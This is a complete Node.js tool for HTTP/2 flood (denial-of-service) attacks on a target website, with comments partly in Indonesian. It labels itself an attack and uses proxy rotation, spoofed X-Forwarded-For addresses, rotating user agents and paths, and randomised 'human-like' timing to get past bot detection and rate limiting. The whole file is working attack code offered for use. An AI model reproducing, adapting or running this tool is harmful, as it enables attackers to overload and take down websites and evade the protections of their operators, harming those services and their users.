const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`Usage: node http.js url time rate threads\nExample: node http.js https://example.com/ 120 16 4`); 
    console.log(`Atau tanpa proxy: node http.js https://example.com/ 120 16 4 --noproxy`);
    process.exit();
}

// Cek apakah menggunakan proxy atau langsung
const useProxy = process.argv[6] !== "--noproxy";

// Support TLS 1.2 dan 1.3
const ciphersTLS12 = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
].join(":");

const ecdhCurve = "x25519:secp256r1:secp384r1";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

const secureContextOptions = {
    ciphers: ciphersTLS12,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
};

const secureContext = tls.createSecureContext(secureContextOptions);

// Load proxies jika ada
var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) {
        console.log(`⚠️  No proxy.txt found, using direct connection`);
    }
}

// ==================== 50+ REALISTIC USER AGENTS ====================
const userAgents = [
    // Windows Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    // Windows Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    // MacOS Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    // MacOS Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    // Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    // iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    // Android
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    // Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    // Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
];

// ==================== 20+ REALISTIC ACCEPT LANGUAGES ====================
const acceptLanguages = [
    "en-US,en;q=0.9",
    "id-ID,id;q=0.9,en;q=0.8",
    "ms-MY,ms;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "hi-IN,hi;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
    "vi-VN,vi;q=0.9,en;q=0.8",
    "th-TH,th;q=0.9,en;q=0.8"
];

// ==================== REALISTIC PATHS & QUERY PARAMS ====================
const commonPaths = [
    "/", "/home", "/about", "/contact", "/blog", "/news", "/products", "/services",
    "/api/v1", "/api/v2", "/auth/login", "/user/profile", "/dashboard", "/settings",
    "/search", "/category", "/shop", "/cart", "/checkout", "/help", "/support"
];

const queryParams = [
    "page", "id", "sort", "filter", "search", "q", "category", "tag", "limit", "offset",
    "view", "lang", "ref", "utm_source", "utm_medium", "utm_campaign"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

// Statistik global
let stats = {
    total: 0,
    success: 0,
    blocked: 0,
    error: 0,
    active: 0
};

if (cluster.isMaster) {
    console.log(`👤 Starting Human-Like Flood Attack`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️  Duration: ${args.time} seconds`);
    console.log(`⚡ Base Rate: ${args.Rate} req/sec per connection`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`🔒 TLS Version: 1.2 & 1.3`);
    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
    console.log(`👨‍💻 Human Behavior: Random delays, varied methods, realistic patterns`);
    console.log(`====================================`);
    
    // Live stats setiap 5 detik (lebih lambat seperti human monitoring)
    const statsInterval = setInterval(() => {
        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
        console.log(`   Total: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        console.log(`   🔗 Active: ${stats.active}`);
        console.log(`   ⚡ Current Rate: ${Math.floor(stats.total / (args.time - (args.time - (Date.now()/1000 - startTime)))) || 0} req/s`);
    }, 5000);
    
    const startTime = Date.now() / 1000;
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n✅ Attack Finished!`);
        console.log(`📊 Final Stats:`);
        console.log(`   Total Requests: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        process.exit(1);
    }, args.time * 1000);
} else {
    // Worker processes with human-like startup delay
    const workerDelay = randomIntn(100, 3000);
    console.log(`Worker ${cluster.worker.id} started (initial delay: ${workerDelay}ms)`);
    
    setTimeout(() => {
        // Multiple intervals dengan variasi seperti human browsing
        const intervalsPerWorker = Math.min(100, args.Rate);
        for (let i = 0; i < intervalsPerWorker; i++) {
            // Human-like random timing, tidak konsisten
            const humanDelay = randomIntn(500, 3000);
            setTimeout(() => {
                setInterval(() => {
                    if (stats.active < 5000) { // Lower active connections like human
                        runFlooder();
                    }
                }, randomIntn(800, 2500)); // Random interval like human thinking time
            }, i * humanDelay);
        }
    }, workerDelay);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return "";
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIP() {
    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
}

// Human-like path generator
function getRealisticPath() {
    let path = randomElement(commonPaths);
    
    // Kadang tambah subpath
    if (Math.random() > 0.7) {
        path += "/" + randomString(randomIntn(3, 10));
    }
    
    // Kadang tambah query params
    if (Math.random() > 0.6) {
        const paramCount = randomIntn(1, 3);
        const params = [];
        for (let i = 0; i < paramCount; i++) {
            const param = randomElement(queryParams);
            const value = Math.random() > 0.5 ? randomString(randomIntn(3, 8)) : randomIntn(1, 9999).toString();
            params.push(`${param}=${value}`);
        }
        path += "?" + params.join("&");
    }
    
    return path;
}

// Random HTTP method like real browser
function getHumanMethod() {
    const rand = Math.random();
    if (rand < 0.85) return "GET";      // 85% GET like normal browsing
    if (rand < 0.95) return "HEAD";     // 10% HEAD for checking
    return "POST";                      // 5% POST for form submissions
}

function runFlooder() {
    stats.active++;
    
    const makeRequest = (proxyConn) => {
        const settings = {
            enablePush: Math.random() > 0.5, // Random push preference
            initialWindowSize: randomIntn(65535, 2147483647),
            maxConcurrentStreams: randomIntn(10, 100)
        };

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphersTLS12,
            requestCert: false,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };

        if (proxyConn) {
            tlsOptions.socket = proxyConn;
        }

        const tlsConn = proxyConn ? 
            tls.connect(443, parsedTarget.host, tlsOptions) :
            tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setNoDelay(Math.random() > 0.5); // Random TCP delay
        tlsConn.setKeepAlive(true, randomIntn(30000, 120000));
        tlsConn.setMaxListeners(0);

        let requestInterval;
        let requestCount = 0;
        const maxRequestsPerSession = randomIntn(5, 30); // Human-like session length
        
        tlsConn.once("secureConnect", () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: settings,
                createConnection: () => tlsConn,
                maxSessionMemory: 1000
            });

            client.setMaxListeners(0);
            
            const startTime = Date.now();
            
            // Human-like reading/thinking time between requests
            const thinkTime = () => {
                return new Promise(resolve => {
                    const delay = randomIntn(500, 5000); // 0.5 to 5 seconds like human reading
                    setTimeout(resolve, delay);
                });
            };
            
            const sendRequest = async () => {
                const elapsed = Date.now() - startTime;
                if (elapsed > args.time * 1000 || requestCount >= maxRequestsPerSession) {
                    clearInterval(requestInterval);
                    client.destroy();
                    if (proxyConn) proxyConn.destroy();
                    stats.active--;
                    return;
                }
                
                // Human-like random path
                const randomPath = getRealisticPath();
                const method = getHumanMethod();
                const userAgent = randomElement(userAgents);
                const acceptLang = randomElement(acceptLanguages);
                
                // Human-like headers dengan variasi
                const headers = {
                    [":method"]: method,
                    [":path"]: randomPath,
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    "user-agent": userAgent,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "accept-language": acceptLang,
                    "accept-encoding": "gzip, deflate, br",
                    "cache-control": Math.random() > 0.8 ? "no-cache" : "max-age=0",
                    "pragma": Math.random() > 0.9 ? "no-cache" : "",
                    "referer": Math.random() > 0.3 ? "https://" + parsedTarget.host + getRealisticPath() : "",
                    "sec-ch-ua": `"${userAgent.includes('Chrome') ? 'Chromium' : 'Not A;Brand'}"`,
                    "sec-ch-ua-mobile": userAgent.includes('Mobile') ? "?1" : "?0",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": Math.random() > 0.7 ? "same-origin" : "cross-site",
                    "upgrade-insecure-requests": "1"
                };
                
                // Remove empty headers
                Object.keys(headers).forEach(key => headers[key] === "" && delete headers[key]);
                
                // Add random X-Forwarded-For only sometimes
                if (Math.random() > 0.8) {
                    headers["x-forwarded-for"] = randomIP();
                }
                
                try {
                    const request = client.request(headers);
                    
                    // Human-like POST data
                    if (method === "POST" && Math.random() > 0.7) {
                        const postData = JSON.stringify({
                            action: randomElement(["login", "search", "filter", "submit"]),
                            data: randomString(randomIntn(5, 20)),
                            timestamp: Date.now()
                        });
                        request.write(postData);
                    }
                    
                    request.on("response", (responseHeaders) => {
                        const statusCode = responseHeaders[":status"];
                        stats.total++;
                        requestCount++;
                        
                        if (statusCode === 200 || statusCode === 201 || statusCode === 304) {
                            stats.success++;
                        } else if (statusCode === 403 || statusCode === 404 || statusCode === 429 || statusCode === 503) {
                            stats.blocked++;
                        } else {
                            stats.error++;
                        }
                        
                        request.close();
                        request.destroy();
                    });
                    
                    request.on("error", () => {
                        stats.total++;
                        stats.error++;
                    });
                    
                    request.end();
                    
                    // Human-like thinking time before next request
                    await thinkTime();
                    
                } catch(e) {
                    stats.total++;
                    stats.error++;
                }
            };
            
            // Start with human-like delay
            setTimeout(() => {
                requestInterval = setInterval(() => {
                    sendRequest();
                }, randomIntn(1000, 4000)); // Random interval between requests
            }, randomIntn(500, 3000));
            
            client.requestInterval = requestInterval;
        });

        tlsConn.on("error", (err) => {
            if (requestInterval) clearInterval(requestInterval);
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        if (proxyConn) {
            proxyConn.on("error", () => {
                if (requestInterval) clearInterval(requestInterval);
                tlsConn.destroy();
                stats.active--;
            });
            
            proxyConn.on("close", () => {
                if (requestInterval) clearInterval(requestInterval);
                stats.active--;
            });
        }
        
        tlsConn.on("close", () => {
            if (requestInterval) clearInterval(requestInterval);
            stats.active--;
        });
    };
    
    // Proxy dengan human-like behavior
    if (useProxy && proxies.length > 0) {
        const proxyAddr = randomElement(proxies);
        if (proxyAddr) {
            const parsedProxy = proxyAddr.split(":");
            if (parsedProxy.length >= 2) {
                const proxyConn = net.connect({
                    host: parsedProxy[0],
                    port: ~~parsedProxy[1],
                    allowHalfOpen: true
                });
                
                proxyConn.setTimeout(randomIntn(15000, 30000));
                proxyConn.setKeepAlive(true, randomIntn(30000, 60000));
                
                const userAgent = randomElement(userAgents);
                const payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\nHost: " + parsedTarget.host + "\r\nUser-Agent: " + userAgent + "\r\n\r\n";
                
                proxyConn.on("connect", () => {
                    proxyConn.write(payload);
                });
                
                proxyConn.on("data", (chunk) => {
                    const response = chunk.toString();
                    if (response.includes("200 Connection established") || response.includes("HTTP/1.1 200")) {
                        proxyConn.removeAllListeners("data");
                        makeRequest(proxyConn);
                    } else {
                        proxyConn.destroy();
                        stats.active--;
                    }
                });
                
                proxyConn.on("error", () => {
                    stats.active--;
                });
                
                proxyConn.on("timeout", () => {
                    proxyConn.destroy();
                    stats.active--;
                });
                
                return;
            }
        }
    }
    
    makeRequest(null);
}

process.on('uncaughtException', (error) => {
    if (stats.active > 0) stats.active--;
});
process.on('unhandledRejection', (error) => {});